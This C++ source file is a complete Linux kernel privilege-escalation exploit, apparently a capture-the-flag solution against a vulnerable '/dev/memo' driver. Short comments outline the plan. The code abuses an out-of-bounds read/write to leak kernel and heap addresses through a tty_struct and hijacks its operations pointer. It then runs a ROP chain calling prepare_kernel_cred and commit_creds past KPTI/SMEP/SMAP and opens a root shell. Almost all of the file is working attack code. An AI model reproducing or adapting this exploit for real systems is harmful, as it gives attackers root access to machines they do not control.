#include <iostream>
#include <fcntl.h>
#include <sys/types.h>
#include <cstring>
#include <unistd.h>
#include <stdlib.h>
#include <sys/ioctl.h>
using namespace std;

// The module is allocating a 0x400 chunk at the very start
// so it's using kmalloc-1024.
// One another struct we can think of is the tty_struct
// for leaks and rip control.
// The vulnerability is that we have oob read/write
// we can lseek to the end of the chunk.
// and then read or write.
// We will be leaking `Heap` and `Text` section.
// Because KPTI - SMAP/EP are enabled we need to rop in the kernel.
// or traverse the `task_struct` until we find our process
// and elevate its privileges.
// I will try to rop in the kernel as it seems more easier.

#define DEVICE_PATH "/dev/memo"
#define MAX_SIZE 0x400

int fd;
int ptmx;

typedef unsigned long ulong;

ulong* chunk;

// Just a wrapper for lseek.
void seek(int offset){
	lseek(fd, offset, SEEK_SET);
}

void read_from(int size){
	read(fd, chunk, size);
}

void write_to(int size){
	write(fd, chunk, size);
}

void prologue(){
	cout << "Exploit started!" << endl;
	fd = open(DEVICE_PATH, O_RDWR);
	ptmx = open("/dev/ptmx", O_RDWR);
	chunk = (ulong*)malloc(MAX_SIZE);
}

void epilogue(){
	close(fd);
	close(ptmx);
	free(chunk);
	cout << "Bye!" << endl;
}

void show_read(){
	for(int i=0; i<(0x400>>3); i++){
		cout << i << "\t0x" << hex << chunk[i] << endl;
	}
}

struct trap_frame{
	ulong rip;
	ulong cs;
	ulong rflags;
	ulong rsp;
	ulong ss;
}__attribute__((packed)) tf;

void save_state(){
	asm volatile("mov tf+8, cs;"
				 "pushf; pop tf+16;"
				 "mov tf+24, rsp;"
				 "mov tf+32, ss;"
			);
}

static void shell(){
	char * argv[] = {"/bin/sh", NULL};
	execve(argv[0], argv, NULL);
}

int main(){
	
	save_state();
	ulong buf[0x40];

	prologue();
	// First we will be trying to get the leaks.
	seek(0x100);
	read_from(0x400);
	show_read();

	ulong kernel_base = chunk[0x63] - 0xe65900;
	ulong kheap = chunk[0x67] - 0x38 - 0x400;

	cout << "Kernel base @ 0x" << hex << kernel_base << endl;
	cout << "The chunk is at @ 0x" << hex << kheap << endl;

	// Change tty_operation* pointer in that struct.
	chunk[0x63] = kheap+0x100;

	ulong gadget = kernel_base + 0x94d4e3;
	ulong pop_rdi = kernel_base + 0x1268;
	ulong mov_rdi_rax = kernel_base + 0x19dcb; // rcx needs to be 0
	ulong pop_rcx = kernel_base + 0x4c852;
	ulong commit_creds = kernel_base + 0x7b8b0;
	ulong prepare_kernel_cred = kernel_base + 0x7bb50;
	ulong swapgs_restore_regs_and_return_to_usermode = kernel_base + 0xa00a45;

	chunk[12] = gadget;

	cout << "Breakpoint here : 0x" << hex << gadget << endl;
	getchar();	
	seek(0x100);
	write_to(0x400);
	
	seek(0x0);
	
	ulong* rop = chunk;
	rop[0] = pop_rdi;
	rop[1] = 0;
	rop[2] = prepare_kernel_cred;
	rop[3] = pop_rcx;
	rop[4] = 0;
	rop[5] = mov_rdi_rax;
	rop[6] = commit_creds;
	rop[7] = swapgs_restore_regs_and_return_to_usermode;
	rop[8] = 0;
	rop[9] = 0;
	rop[10] = (ulong)shell;
	rop[11] = tf.cs;
	rop[12] = tf.rflags;
	rop[13] = tf.rsp;
	rop[14] = tf.ss;

	write_to(0x100);

	ioctl(ptmx, 0x0, kheap-0x8);

	epilogue();
	return 0;
}
